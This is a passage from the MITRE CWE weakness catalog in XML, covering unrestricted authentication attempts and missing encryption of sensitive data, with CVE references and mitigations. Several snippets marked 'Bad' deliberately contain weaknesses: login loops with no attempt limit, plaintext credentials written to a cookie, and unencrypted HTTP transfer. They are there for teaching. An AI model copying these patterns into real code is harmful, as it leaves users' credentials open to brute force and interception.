                     <xhtml:br/>int authResult = authenticateUser(username, password);</xhtml:div>
               </Example_Code>
               <Body_Text>However, the software makes no attempt to restrict excessive authentication attempts.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code attempts to limit the number of login attempts by causing the process to sleep before completing the authentication.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$username = $_POST['username'];<xhtml:br/>$password = $_POST['password'];<xhtml:br/>sleep(2000);<xhtml:br/>$isAuthenticated = authenticateUser($username, $password);</xhtml:div>
               </Example_Code>
               <Body_Text>However, there is no limit on parallel connections, so this does not increase the amount of time an attacker needs to complete an attack.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following C/C++ example the validateUser method opens a socket connection, reads a username and password from the socket and attempts to authenticate the username and password.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int validateUser(char *host, int port)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int socket = openSocketConnection(host, port);<xhtml:br/>if (socket &lt; 0) {<xhtml:div style="margin-left:1em;">printf("Unable to open socket connection");<xhtml:br/>return(FAIL);</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>int isValidUser = 0;<xhtml:br/>char username[USERNAME_SIZE];<xhtml:br/>char password[PASSWORD_SIZE];<xhtml:br/>
                           <xhtml:br/>while (isValidUser == 0) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if (getNextMessage(socket, username, USERNAME_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">if (getNextMessage(socket, password, PASSWORD_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">isValidUser = AuthenticateUser(username, password);</xhtml:div>}</xhtml:div>}</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return(SUCCESS);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The validateUser method will continuously check for a valid username and password without any restriction on the number of authentication attempts made. The method should limit the number of authentication attempts made to prevent brute force attacks as in the following example code.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>int validateUser(char *host, int port)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>int count = 0;<xhtml:br/>while ((isValidUser == 0) &amp;&amp; (count &lt; MAX_ATTEMPTS)) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if (getNextMessage(socket, username, USERNAME_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">if (getNextMessage(socket, password, PASSWORD_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">isValidUser = AuthenticateUser(username, password);</xhtml:div>}</xhtml:div>}<xhtml:br/>count++;</xhtml:div>
                           </xhtml:div>}<xhtml:br/>if (isValidUser) {<xhtml:div style="margin-left:1em;">return(SUCCESS);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">return(FAIL);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
		  <Demonstrative_Example>
		    <Intro_Text>Consider this example from a
		    real-world attack against the iPhone
		    [REF-1218]. An attacker can use brute force
		    methods; each time there is a failed guess, the
		    attacker quickly cuts the power before the failed
		    entry is recorded, effectively bypassing the
		    intended limit on the number of failed
		    authentication attempts. Note that this attack
		    requires removal of the cell phone battery and
		    connecting directly to the phone's power source,
		    and the brute force attack is still
		    time-consuming.</Intro_Text>
		  </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-0039</Reference>
               <Description>the REST API for a network OS has a high limit for number of connections, allowing brute force password guessing </Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-0039</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1152</Reference>
               <Description>Product does not disconnect or timeout after multiple failed logins.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1291</Reference>
               <Description>Product does not disconnect or timeout after multiple failed logins.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1291</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0395</Reference>
               <Description>Product does not disconnect or timeout after multiple failed logins.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0395</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1339</Reference>
               <Description>Product does not disconnect or timeout after multiple failed logins.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1339</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0628</Reference>
               <Description>Product does not disconnect or timeout after multiple failed logins.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0628</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1324</Reference>
               <Description>User accounts not disabled when they exceed a threshold; possibly a resultant problem.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1324</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_ID>AUTHENT.MULTFAIL</Entry_ID>
               <Entry_Name>Multiple Failed Authentication Attempts not Prevented</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP34</Entry_ID>
               <Entry_Name>Unrestricted authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="16"/>
            <Related_Attack_Pattern CAPEC_ID="49"/>
            <Related_Attack_Pattern CAPEC_ID="560"/>
            <Related_Attack_Pattern CAPEC_ID="565"/>
            <Related_Attack_Pattern CAPEC_ID="600"/>
            <Related_Attack_Pattern CAPEC_ID="652"/>
            <Related_Attack_Pattern CAPEC_ID="653"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-236"/>
            <Reference External_Reference_ID="REF-1218"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name, Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Multiple Failed Authentication Attempts not Prevented</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-02-16">Failure to Restrict Excessive Authentication Attempts</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="311" Name="Missing Encryption of Sensitive Data" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not encrypt sensitive or critical information before storage or transmission.</Description>
         <Extended_Description>The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>The characterizaton of sensitive data often requires domain-specific understanding, so manual methods are useful. However, manual efforts might not achieve desired code coverage within limited time constraints. Black box methods may produce artifacts (e.g. stored data or unencrypted network transfer) that require manual evaluation.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated measurement of the entropy of an input/output source may indicate the use or lack of encryption, but human analysis is still required to distinguish intentionally-unencrypted data (e.g. metadata) from sensitive data.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Network Sniffer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Clearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Ensure that encryption is properly integrated into the system design, including but not necessarily limited to:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Encryption that is needed to store or transmit private data of the users of the system</xhtml:li>
                        <xhtml:li>Encryption that is needed to protect the system itself from unauthorized disclosure or tampering</xhtml:li>
                     </xhtml:ul>
                  <xhtml:p>Identify the separate needs and contexts for encryption:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the product) does not need to have access to a private key.</xhtml:li>
                        <xhtml:li>Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.</xhtml:li>
                     </xhtml:ul>
                  <xhtml:p>Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-24">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification.</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
               <Effectiveness_Notes>This makes it easier to spot places in the code where data is being used that is unencrypted.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user does not have to login again later.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function persistLogin($username, $password){<xhtml:div style="margin-left:1em;">$data = array("username" =&gt; $username, "password"=&gt; $password);<xhtml:br/>setcookie ("userdata", $data);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.</Body_Text>
               <Body_Text>Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a password, then store it to a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);<xhtml:br/>if (hp==NULL) error("Unknown host");<xhtml:br/>memcpy( (char *)&amp;server.sin_addr,(char *)hp-&gt;h_addr,hp-&gt;h_length);<xhtml:br/>if (argc &lt; 3) port = 80;<xhtml:br/>else port = (unsigned short)atoi(argv[3]);<xhtml:br/>server.sin_port = htons(port);<xhtml:br/>if (connect(sock, (struct sockaddr *)&amp;server, sizeof server) &lt; 0) error("Connecting");<xhtml:br/>...<xhtml:br/>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>write(dfd,password_buffer,n);<xhtml:br/>...<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to communicate sensitive information.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">URL u = new URL("http://www.secret.example.org/");<xhtml:br/>HttpURLConnection hu = (HttpURLConnection) u.openConnection();<xhtml:br/>hu.setRequestMethod("PUT");<xhtml:br/>hu.connect();<xhtml:br/>OutputStream os = hu.getOutputStream();<xhtml:br/>hu.disconnect();</xhtml:div>}<xhtml:br/>catch (IOException e) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>//...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-2272</Reference>
               <Description>password and username stored in cleartext in a cookie</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1466</Reference>
               <Description>password stored in cleartext in a file with insecure permissions</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1466</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0152</Reference>
               <Description>chat program disables SSL in some circumstances even when the user says to use SSL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1603</Reference>
               <Description>Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0964</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6157</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6828</Reference>
               <Description>product stores a password in cleartext in memory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1567</Reference>
               <Description>storage of a secret key in cleartext in a temporary file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1567</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0174</Reference>
               <Description>SCADA product uses HTTP Basic Authentication, which is not encrypted</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5778</Reference>
               <Description>login credentials stored unencrypted in a registry key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1949</Reference>
               <Description>Passwords transmitted in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4122</Reference>
               <Description>Chain: Use of HTTPS cookie without "secure" flag causes it to be transmitted across unencrypted HTTP.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4122</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3289</Reference>
               <Description>Product sends password hash in cleartext in violation of intended policy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4390</Reference>
               <Description>Remote management feature sends sensitive information including passwords in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4390</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5626</Reference>
               <Description>Backup routine sends password in cleartext in email.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5626</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1852</Reference>
               <Description>Product transmits Blowfish encryption key in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0374</Reference>
               <Description>Printer sends configuration information, including administrative password, in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4786</Reference>
               <Description>Product sends passwords in cleartext to a log server.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4786</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3140</Reference>
               <Description>Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3140</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to encrypt data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>4</Entry_ID>
               <Entry_Name>Insufficient Transport Layer Protection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC00-J</Entry_ID>
               <Entry_Name>Use SSLSocket rather than Socket for secure data exchange</Entry_Name>
            </Taxonomy_Mapping>
